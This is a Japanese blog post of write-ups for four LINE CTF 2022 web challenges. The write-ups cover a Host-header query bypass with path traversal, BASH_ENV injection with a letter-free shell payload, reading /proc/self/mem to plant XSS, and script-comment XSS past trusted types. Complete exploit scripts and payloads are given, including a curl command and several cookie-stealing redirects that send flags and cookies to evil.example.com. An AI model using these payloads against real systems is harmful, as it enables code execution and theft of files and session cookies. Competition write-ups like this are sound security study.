---
title: LINE CTF 2022 writeup (web challs)
thumbnail: /images/2022/20220327-linectf-02.png
date: 2022-03-27 22:00:00
tags:
    - CTF
description: LINE CTF 2022 に ./Vespiary で参加して13位でした！解いた問題のwriteupを書きます。
---

LINE CTF 2022 に ./Vespiary で参加して13位でした！

<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">LINE CTF 2022お疲れ様でした。13位！ web良問揃いでたのしかったです <a href="https://t.co/1GTm8Lw5ax">pic.twitter.com/1GTm8Lw5ax</a></p>&mdash; Ark (@arkark_) <a href="https://twitter.com/arkark_/status/1507949797231443972?ref_src=twsrc%5Etfw">March 27, 2022</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

解いたweb問のwriteupを書きます。

## Links

- ctftime: https://ctftime.org/event/1472/

## 感想

LINE CTFは去年から始まって2回目です。企業が大きめの賞金を出してCTFを主催しているのは貴重だし、こういう風潮ができると世間的にも盛り上がりが増すと思うので、CTF playerとしても非常にありがたいです。感謝しかない。

問題については、ツイートでも言ってますがweb問はどれも質が高く内容もおもしろかったです。来年も開催されるなら是非参加したいです（来年も開催お願いします！）。

また、昨年は難しい問題に全然太刀打ちできなかった記憶があるのですが、今年は比較的多くの問題が解けて成長を実感できてうれしいです。精進していきたい。解けなかった（というより挑む時間が割けなかった）問題も復習したいので、問題ファイルや公式writeupが公開されるといいな。

## [web] Memo Drive

147 pts, 42 solves

問題文:

> （なし）

### 問題概要

- Starlette製のメモ投稿サービス
- フラグは問題サーバの `./memo/flag` に置かれている

### 解法

```python
# index.py

def view(request):
    context = {}

    try:
        context['request'] = request
        clientId = getClientID(request.client.host)

        if '&' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]):
            raise

        filename = request.query_params[clientId]
        path = './memo/' + "".join(request.query_params.keys()) + '/' + filename

        f = open(path, 'r')
        contents = f.readlines()
        f.close()

        context['filename'] = filename
        context['contents'] = contents

    except:
        pass

    return templates.TemplateResponse('/view/view.html', context)
```

`/view`のエンドポイントで、`path`の値が`./memo/flag`相当のパスになるようなリクエストを送れたらフラグファイルが見れる。ただし、クエリのバリデーションがあるせいで簡単にはpath traversalができないようになっている。

バリデーションに`request.url.query`と`request.query_params`の2種類を使っているのが怪しい。

`request.url.query`の実装を見てみると、`HOST`ヘッダを参照してURLを解釈していることがわかった:

- `request.host`: https://github.com/encode/starlette/blob/0.16.0/starlette/requests.py#L88
    - `URL`クラスを使用している。
- `URL`クラス: https://github.com/encode/starlette/blob/0.16.0/starlette/datastructures.py#L31-L47
    - 一度URLをパースしたあと、`HOST`ヘッダが存在すればその値にホストを書き換えてURLを再構成し、再びパースする。

よって、リクエストに`Host: example.com#`のヘッダを付けるとURLのドメイン以降がすべてフラグメントとして解釈されて`request.url.query`が空文字列になる。

一方で、`request.query_params`は`HOST`ヘッダに左右されないのでこの実装の差異を用いてbypassが可能。あとはpath traversalをするだけ。


### 攻撃

以下のようなリクエストを投げるとOK。


```sh
$ http "http://34.146.195.115/view?9dd4e461268c8034f5c8564e155c67a6=flag&%2F.." Host:"example.com#"
HTTP/1.1 200 OK
content-length: 683
content-type: text/html; charset=utf-8
date: Sat, 26 Mar 2022 18:07:05 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <script type="text/javascript" src="/memo.js"></script>
    <script type="text/javascript" src="/jquery.min.js"></script>
    <link rel="stylesheet" type="text/css" href="/static/memo.css">

    <title>Simple Memo</title>
</head>
<body>
    <div class="main">
        <p>
            <span>flag</span><br/>
            <input type="button" id="memo-button" value="BACK" onclick="history.back()"/><br/>
            <span id="memo-box">


                    LINECTF{The_old_bug_on_urllib_parse_qsl_fixed}

            </span>
        </p>
    </div>
</body>
</html>
```

### フラグ

```
LINECTF{The_old_bug_on_urllib_parse_qsl_fixed}
```

## [web / misc] bb

179 pts, 27 solves

問題文:

> Read /flag

### 問題概要

- miscタグがついてるPHPのweb問
- フラグは問題サーバの`/flag`に置かれている

PHPのコードはこれだけ:
```php
//
<?php
    error_reporting(0);

    function bye($s, $ptn){
        if(preg_match($ptn, $s)){
            return false;
        }
        return true;
    }

    foreach($_GET["env"] as $k=>$v){
        if(bye($k, "/=/i") && bye($v, "/[a-zA-Z]/i")) {
            putenv("{$k}={$v}");
        }
    }
    system("bash -c 'imdude'");

    foreach($_GET["env"] as $k=>$v){
        if(bye($k, "/=/i")) {
            putenv("{$k}");
        }
    }
    highlight_file(__FILE__);
?>
```

- クエリパラメータで環境変数を登録できる
    - `bye`関数でバリデーションあり
- `bash`で存在しないコマンド`imdude`を呼んでいる

### 解法

まず、存在しないコマンドを叩いてるのは明らかにおかしいので、ここが問題の中心。bashにいい感じの環境変数を渡すことで、存在しないコマンドを叩いたときの挙動が変わることができたらうれしい。

調べてみるとshell shock[^bb-1]の記事が見つかった:

- [CVE-2014-6271　Shell shock脆弱性解説 - Marsの5εcur1ty備忘録](https://marsblog.hatenablog.jp/entry/2019/02/17/054844)
- [bash - 環境変数から関数を取得する機能のセキュリティ強化 - 気ままなブログ](https://entree.hatenadiary.org/entry/20140928/1411885652)

[^bb-1]: 結局この問題では使えなかったが、名前は聞いたことがあったが中身を知らなかった有名脆弱性だったので丁度よい勉強になった。

今回の問題であれば、`BASH_FUNC_imdude%%`の環境変数を任意に登録できたら任意コード実行が可能になる。ただし、`system`関数実行時に経由するsh（中身はdash）が`%`を含む名前の環境変数を拒否するということをチームメンバが発見してくれて、無理だということがわかった。

途方に暮れていたら、チームメンバが
```
BASH_ENV=$(cat /flag | hogehoge)
```
のように環境変数を登録すると任意コード実行できることを発見してくれたので、あとは環境変数の値部分のバリデーションをbypassするだけとなった。

環境変数の値は`"/[a-zA-Z]/i"`にマッチしないようにする必要がある。これはシュル芸で記号オンリーでアルファベットを生成する手法がある[^bb-2]ので、それを使えばOK:

- [記号だけでシェルは操れた - Ryoto's Blog](https://www.ryotosaito.com/blog/?p=194)

[^bb-2]: 日本はシェル芸が活発な界隈（？）があるので、資料が豊富でいいですね。この手の問題は日本人が有利かも。

### 攻撃

```python
import httpx
import string
from urllib.parse import quote

BASE_URL = "http://34.84.94.104"
# BASE_URL = "http://localhost:3000"

HOOK_URL = "https://evil.example.com"

COMMAND = f'curl "{HOOK_URL}/$(cat /flag)"'

# ref. https://www.ryotosaito.com/blog/?p=194
ALPHABET_PAYLOAD = r'__=$(($$/$$));___=$(($__+$__));____=$(.&>/???/??/$__);____=${____##*.};_____=$(${____:$(($___$(($$-$$))-$__)):$__}${____:$___*$___:$__}${____:$(($___$(($$-$$))-$___)):$__} -${____:$__$(($__+$___)):$__}&>/???/??/$__);_____=${_____##*${____:$(($___$(($$-$$))-$__)):$__}${____:$___*$___:$__}${____:$(($___$(($$-$$))-$___)):$__}};_____=${_____,,};______=($(${____:$(($___*$___)):$__}${_____:$__$(($___*$___)):$__}${____:$(($___*$___+$___)):$__}${____:$(($___+$__)):$__} ${____:$(($___*$___)):$__}${_____:$(($___*$___*$___*$___+$__)):$__}${_____:$(($___*$___*$___-$__)):$__}${_____:$___$(($___*$___)):$__} $(${____:$(($___*$___)):$__}${_____:$(($___*$___*$___*$___+$__)):$__}${_____:$(($___*$___*$___-$__)):$__}${_____:$___$(($___*$___)):$__}  -${____:$(($___*$___)):$__} "{\\${____:$__$(($___*$___)):$__}$(($___*$___+$___))$__..\\${____:$__$(($___*$___)):$__}$(($___*$___*$___-$__))${____:$__$__:$__}}")));_______=($(${____:$(($___*$___)):$__}${_____:$__$(($___*$___)):$__}${____:$(($___*$___+$___)):$__}${____:$(($___+$__)):$__} ${____:$(($___*$___)):$__}${_____:$(($___*$___*$___*$___+$__)):$__}${_____:$(($___*$___*$___-$__)):$__}${_____:$___$(($___*$___)):$__}  $(${____:$(($___*$___)):$__}${_____:$(($___*$___*$___*$___+$__)):$__}${_____:$(($___*$___*$___-$__)):$__}${_____:$___$(($___*$___)):$__}  -${____:$(($___*$___)):$__} "{\\${____:$__$(($___*$___)):$__}$(($___*$___))$__..\\${____:$__$(($___*$___)):$__}$(($___*$___+$__))${____:$__$__:$__}}")))'
# echo ${______[1]} -> b
# echo ${_______[1]} -> B


def convert_char(c: str) -> str:
    assert len(c) == 1
    i = string.ascii_lowercase.find(c)
    if i >= 0:
        return "${______[" + str(i) + "]}"
    i = string.ascii_uppercase.find(c)
    if i >= 0:
        return "${_______[" + str(i) + "]}"
    return c


converted_command = "".join([convert_char(c) for c in COMMAND])
result_payload = f"$({ALPHABET_PAYLOAD};{converted_command})"

res = httpx.get(
    f"{BASE_URL}?env[BASH_ENV]={quote(result_payload)}"
)
assert res.status_code == 200

print(res.text)
```

### フラグ

```
LINECTF{well..what_do_you_think_about}
```

## [web] online library

210 pts, 19 solves

問題文:

> Some weird book library web is under developing now.

### 問題概要

- Express製
- bot（クローラ）のクッキーにフラグがセットされる

### 解法

`/:t/:s/:e` のエンドポイントでpath traversalが可能で、問題サーバ上のread権限がある任意のファイルをoffsetとlengthの指定付きで読むことができる。また、テキストはHTMLとして表示されるので、XSSペイロードを含むテキストをbotにアクセスさせると攻撃が成立する。

ところで、`/proc/self/mem`も読めるのでメモリの中身を直接取り出せる。XSSペイロードがnodeプロセスのメモリに残るような適当なリクエストをあらかじめ投げておいて、メモリ上のペイロードの位置を特定してから、botがそこのメモリを読むようにreportすれば良さそう。

試しに`/identify`エンドポイントで`username`に入れた文字列がメモリ上に残ることを確認したので、上記の攻撃は成立する。

### 攻撃

```python
import httpx
import time

BASE_URL = "http://35.243.100.112"
# BASE_URL = "http://localhost:10100"

HOOK_URL = "https://evil.example.com"
EVIL_CODE = f'</script><script>location="{HOOK_URL}/"+document.cookie</script>'.encode()


MAPS_PREFIX = "<h1>../../../../proc/self/maps</h1><hr/>"
MEM_PREFIX = "<h1>../../../../proc/self/mem</h1><hr/>"

MAX_LEN = 1024 * 256

res = httpx.get(
    f"{BASE_URL}/..%2F..%2F..%2F..%2Fproc%2Fself%2Fmaps/0/6196",
)
assert res.status_code == 200

open("data/maps", "wb").write(res.content)

maps = res.content[len(MAPS_PREFIX):].rstrip(b"\x00")

for line in maps.split(b"\n"):
    if b"[heap]" in line:
        print(line)
        parts = line.split(b" ")[0].split(b"-")
        mem_start = int(parts[0], 16)
        mem_end = int(parts[1], 16)

        for i in range(1000):
            start = mem_start + MAX_LEN*i
            end = min(mem_end, mem_start + MAX_LEN*(i+1))
            if start > end:
                break

            res = httpx.get(
                f"{BASE_URL}/..%2F..%2F..%2F..%2Fproc%2Fself%2Fmem/{start}/{end}",
                timeout=5,
            )
            assert res.status_code == 200

            mem = res.content[len(MEM_PREFIX):].rstrip(b"\x00")

            open(f"data/mem/{start}_{end}", "wb").write(mem)

            index = mem.find(EVIL_CODE)
            if index >= 0:
                margin = 1024 * 50

                code_start = start + index
                code_end = start + (index + len(EVIL_CODE))
                evil_payload = f"/..%2F..%2F..%2F..%2Fproc%2Fself%2Fmem/{code_start - margin}/{code_end + margin}"
                print(f"{evil_payload = }")

                res = httpx.get(
                    f"{BASE_URL}{evil_payload}",
                    timeout=5,
                )
                assert res.status_code == 200
                assert EVIL_CODE in res.content

                exit(0)

            time.sleep(0.5)
```

1. 上記スクリプト内の`EVIL_CODE`の文字列を`/identify`エンドポイントで送信。
2. 上記スクリプトを実行。
3. 表示されたURLをreportすると、フラグが降ってくる。

### フラグ

```
LINECTF{705db4df0537ed5e7f8b6a2044c4b5839f4ebfa4}
```

## [web] Haribote Secure Note

322 pts, 7 solves

問題文:

> I LOVE MODERN FEATURES! MODERN IS THE SUPREME!!

### 問題概要

- flask製のノート投稿サービス
- bot（クローラ）のクッキーにフラグがセットされる
- 投稿したノート一覧をbotに見せることが可能

### 解法

`innerHTML`経由で好きな文字列を代入することができるが、trustedTypesでXSSが防がれている:
```html
    <script nonce="{{ csp_nonce }}">
        (() => {
            trustedTypes.createPolicy("default", {
                createHTML(unsafe) {
                    return unsafe
                        .replace(/&/g, "&amp;")
                        .replace(/</g, "&lt;")
                        .replace(/>/g, "&gt;")
                        .replace(/"/g, "&quot;")
                        .replace(/"/g, "&#039;")
                }
            });
        })();
    </script>
```

ただし、trustedTypesなどのCSPの機構はクライアントでの実行時の防御機構であるため、サーバ上でのレンダリング（テンプレートエンジンの文字列展開）はCSPの影響を受けない。

テンプレートエンジン経由でXSSが仕込めそうなのは、`index.j2`内の以下の2箇所:
```html
        <script nonce="{{ csp_nonce }}">
            const printInfo = () => {
                const sharedUserId = "{{ shared_user_id }}";
                const sharedUserName = "{{ shared_user_name }}";
                /* ... snip ... */
            }
            /* ... snip ... */
        </script>
```
```html
    <script nonce="{{ csp_nonce }}">
        const render = notes => {
            /* ... snip ... */
        };
        render({{ notes }})
    </script>
```

- `{{ shared_user_id }}`は`^[a-zA-Z0-9-_]{1,50}$`のバリデーションがあるので使い物にならない。
- `{{ shared_user_name }}`は任意文字列を仕込めるが、長さ上限が16で短い。
- `{{ notes }}`はdictで、展開時に文字列に変換されてレンダリングされる。dict内のkey/valueのvalue部分に好きな文字列を仕込める。
    - ただし、`'`は`\'`にエスケープされてしまうので、ここ単独だけではXSSはできない。

ちょうど`{{ shared_user_name }}`はHTML上部で`{{ notes }}`はHTML下部であるため、間の部分をいい感じにコメントアウトすれば、XSSができそう。

`<script>`周りのコメントアウトの仕様はややこしいが、試行錯誤したら間の部分を[script data double escaped state](https://html.spec.whatwg.org/multipage/parsing.html#script-data-double-escaped-state)にすることで実現できた:

- [&lt;script&gt;要素の構文 - Zenn](https://zenn.dev/qnighy/articles/4f6c728d452295)
    - 日本語の記事だとこれがわかりやすいです

### 攻撃

1. 以下の内容のノートを投稿する:
    ```html
    --> */ };location="https://evil.example.com"+document.cookie</script></div></body></html><!--
    ```
1. `"/*<!--<script>`をdisplayNameにする。
1. botにreportする。

最終的に
```html
<!-- snip -->
        <script nonce="{{ csp_nonce }}">
            const printInfo = () => {
                const sharedUserId = "{{ shared_user_id }}";
                const sharedUserName = ""/*<!--<script>";

            ここの部分が script data double escaped state で無視される

        render([{... snip ... : '--> */ };location="https://evil.example.com"+document.cookie</script></div></body></html><!--'}])
    </script>
{% endblock %}
```
のようなHTMLになり、フラグGET。

### フラグ

```
LINECTF{0n1y_u51ng_m0d3rn_d3fen5e_m3ch4n15m5_i5_n0t_3n0ugh_t0_0bt41n_c0mp13te_s3cur17y}
```
